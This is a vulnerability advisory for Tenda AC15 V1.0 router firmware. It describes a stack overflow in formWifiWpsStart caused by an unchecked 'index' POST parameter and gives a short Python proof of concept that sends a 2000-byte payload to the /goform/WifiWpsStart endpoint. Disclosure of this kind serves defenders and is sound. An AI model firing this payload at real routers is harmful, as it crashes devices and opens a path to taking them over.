## Overview

- Firmware download website: https://www.tendacn.com/us/download/detail-3851.html

## Affected version

AC15V1.0 V15.03.20_multi

## Vulnerability details

The Tenda AC15V1.0 V15.03.20_multi firmware has a stack overflow vulnerability in the `formWifiWpsStart` function. The `nptr` variable receives the `index` parameter from a POST request. The value is directly used in a `sprintf` function and passes to a local variable on the stack, which can override the return address of the function. The user-provided `index` can trigger this security vulnerability.

![image-20240314181333792](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240314181333792.png)

![image-20240314181250516](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240314181250516.png)

![image-20240314181310033](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240314181310033.png)

## POC

```python
import requests
from pwn import*

ip = "192.168.84.101"
url = "http://" + ip + "/goform/WifiWpsStart"
payload = b"a"*2000

data = {"index": payload}
response = requests.post(url, data=data)
print(response.text)
```

![image-20240314181344805](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240314181344805.png)